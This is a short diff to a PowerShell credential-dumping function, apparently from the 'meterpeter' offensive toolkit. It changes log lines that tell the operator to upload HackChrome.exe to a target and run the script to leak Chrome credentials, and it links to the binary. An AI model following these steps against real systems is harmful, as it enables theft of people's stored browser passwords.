@@ -842,7 +842,7 @@ function CREDS_DUMP {
         echo "`nLeaking Chrome Creds" >> $LogFilePath\BrowserEnum.log
         echo "--------------------" >> $LogFilePath\BrowserEnum.log
         echo "{Upload: meterpeter\mimiRatz\HackChrome.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
-        echo "{And Execute: [ ./GetBrowsers.ps1 -CHROME ] to leak chrome credentials}" >> $LogFilePath\BrowserEnum.log
+        echo "{And Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak chrome credentials}" >> $LogFilePath\BrowserEnum.log
         echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/HackChrome.exe}" >> $LogFilePath\BrowserEnum.log
     }
     
@@ -885,6 +885,7 @@ function CREDS_DUMP {
         }
     }
 }
+
 
 
 ## Jump Links (Functions)
